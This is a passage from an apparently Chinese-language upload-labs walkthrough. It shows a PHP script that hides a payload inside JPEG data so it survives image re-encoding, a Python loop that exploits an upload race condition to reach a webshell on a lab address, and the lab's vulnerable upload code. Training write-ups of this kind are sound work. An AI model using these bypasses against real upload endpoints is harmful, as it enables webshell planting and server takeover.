class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行脚本命令：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jpg_payload.php <span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure><h1 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传失败！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h2><p>这种过滤方法是条件筛选，先上传文件，如果不符合格式再将文件删除。所以可以在文件没被删除时访问即可，利用这个时间差执行，但是时间差很短，所以我们可以直接使用脚本访问。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.31.88/upload-labs/upload/webshell.jpg&quot;</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    html = requests.<span class="title function_ invoke__">get</span>(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="方法二-2"><a href="#方法二-2" class="headerlink" title="方法二"></a>方法二</h2><p>将上传页面和文件包含触发漏洞页面发送到Burp的intruder，然后payload设置为null，即可触发条件竞争漏洞</p><h1 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    <span class="variable">$imgFileName</span> =<span class="title function_ invoke__">time</span>();</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> <span class="title class_">MyUpload</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;<span class="title function_ invoke__">upload</span>(<span class="variable">$UPLOAD_ADDR</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$status_code</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$u</span>-&gt;cls_upload_dir . <span class="variable">$u</span>-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传目录不可写。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">3</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">4</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传的文件过大。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">5</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">6</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;未知错误！&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$cls_arr_ext_accepted</span> = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> <span class="variable">$dir</span> </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isUploadedFile</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setDir</span>( <span class="variable">$dir</span> );</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkExtension</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkSize</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkFileExists</span>();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">renameFile</span>();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br><span 